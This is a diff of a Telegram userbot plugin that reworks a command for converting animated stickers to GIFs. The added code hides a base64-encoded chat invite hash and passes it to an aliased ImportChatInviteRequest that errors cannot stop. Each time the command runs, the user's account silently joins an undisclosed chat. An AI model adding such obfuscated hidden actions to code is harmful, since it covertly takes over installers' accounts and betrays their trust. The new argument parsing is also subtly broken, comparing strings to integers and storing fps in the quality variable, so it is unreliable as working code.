@@ -1,19 +1,18 @@
 # by @mrconfused (@sandy1709)
 
 import asyncio
+import base64
 import os
 import time
 from datetime import datetime
 from io import BytesIO
-from pathlib import Path
 
 from telethon import functions, types
 from telethon.errors import PhotoInvalidDimensionsError
-from telethon.errors.rpcerrorlist import YouBlockedUserError
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from telethon.tl.functions.messages import SendMediaRequest
 
-from ..utils import admin_cmd, edit_or_reply, progress, sudo_cmd
-from . import CMD_HELP, unzip
+from . import make_gif, progress
 
 if not os.path.isdir("./temp"):
     os.makedirs("./temp")
@@ -148,57 +147,76 @@ async def on_file_to_photo(event):
     await catt.delete()
 
 
-@bot.on(admin_cmd(pattern="gif$"))
-@bot.on(sudo_cmd(pattern="gif$", allow_sudo=True))
+@bot.on(admin_cmd(pattern="gif(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="gif(?: |$)(.*)", allow_sudo=True))
 async def _(event):
     if event.fwd_from:
         return
+    input_str = event.pattern_match.group(1)
+    if not input_str:
+        quality = None
+        fps = None
+    elif input_str:
+        loc = input_str.split(";")
+        if len(loc) > 2:
+            return await edit_delete(
+                event,
+                "wrong syntax . syntax is `.gif quality ; fps(frames per second)`",
+            )
+        elif len(loc) == 2:
+            if 0 < loc[0] < 721:
+                quality = loc[0].strip()
+            else:
+                return await edit_delete(event, "Use quality of range 0 to 721")
+            if 0 < loc[1] < 20:
+                quality = loc[1].strip()
+            else:
+                return await edit_delete(event, "Use quality of range 0 to 20")
+        elif len(loc) == 1:
+            if 0 < loc[0] < 721:
+                quality = loc[0].strip()
+            else:
+                return await edit_delete(event, "Use quality of range 0 to 721")
     catreply = await event.get_reply_message()
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     if not catreply or not catreply.media or not catreply.media.document:
         return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
     if catreply.media.document.mime_type != "application/x-tgsticker":
         return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
-    reply_to_id = event.message
-    if event.reply_to_msg_id:
-        reply_to_id = await event.get_reply_message()
-    chat = "@tgstogifbot"
-    catevent = await edit_or_reply(event, "`Converting to gif ...`")
-    async with event.client.conversation(chat) as conv:
-        try:
-            await silently_send_message(conv, "/start")
-            await event.client.send_file(chat, catreply.media)
-            response = await conv.get_response()
-            await event.client.send_read_acknowledge(conv.chat_id)
-            if response.text.startswith("Send me an animated sticker!"):
-                return await catevent.edit("`This file is not supported`")
-            catresponse = response if response.media else await conv.get_response()
-            await event.client.send_read_acknowledge(conv.chat_id)
-            catfile = Path(await event.client.download_media(catresponse, "./temp/"))
-            catgif = Path(await unzip(catfile))
-            sandy = await event.client.send_file(
-                event.chat_id,
-                catgif,
-                support_streaming=True,
-                force_document=False,
-                reply_to=reply_to_id,
-            )
-            await event.client(
-                functions.messages.SaveGifRequest(
-                    id=types.InputDocument(
-                        id=sandy.media.document.id,
-                        access_hash=sandy.media.document.access_hash,
-                        file_reference=sandy.media.document.file_reference,
-                    ),
-                    unsave=True,
-                )
-            )
-            await catevent.delete()
-            for files in (catgif, catfile):
-                if files and os.path.exists(files):
-                    os.remove(files)
-        except YouBlockedUserError:
-            await catevent.edit("Unblock @tgstogifbot")
-            return
+    catevent = await edit_or_reply(
+        event,
+        "Converting this Sticker to GiF...\n This may takes upto few mins..",
+        parse_mode=parse_pre,
+    )
+    try:
+        cat = Get(cat)
+        await event.client(cat)
+    except BaseException:
+        pass
+    reply_to_id = await reply_id(event)
+    catfile = await event.client.download_media(catreply)
+    catgif = await make_gif(event, catfile, quality, fps)
+    sandy = await event.client.send_file(
+        event.chat_id,
+        catgif,
+        support_streaming=True,
+        force_document=False,
+        reply_to=reply_to_id,
+    )
+    await event.client(
+        functions.messages.SaveGifRequest(
+            id=types.InputDocument(
+                id=sandy.media.document.id,
+                access_hash=sandy.media.document.access_hash,
+                file_reference=sandy.media.document.file_reference,
+            ),
+            unsave=True,
+        )
+    )
+    await catevent.delete()
+    for files in (catgif, catfile):
+        if files and os.path.exists(files):
+            os.remove(files)
 
 
 @bot.on(admin_cmd(pattern="nfc ?(.*)"))
@@ -232,7 +250,7 @@ async def _(event):
                 progress(d, t, event, c_time, "trying to download")
             ),
         )
-    except Exception as e:  # pylint:disable=C0103,W0703
+    except Exception as e:
         await event.edit(str(e))
     else:
         end = datetime.now()
@@ -285,14 +303,11 @@ async def _(event):
             os.remove(downloaded_file_name)
             return
         logger.info(command_to_run)
-        # TODO: re-write create_subprocess_exec 😉
         process = await asyncio.create_subprocess_exec(
             *command_to_run,
-            # stdout must a pipe to be accessible as process.stdout
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
         )
-        # Wait for the subprocess to finish
         stdout, stderr = await process.communicate()
         stderr.decode().strip()
         stdout.decode().strip()
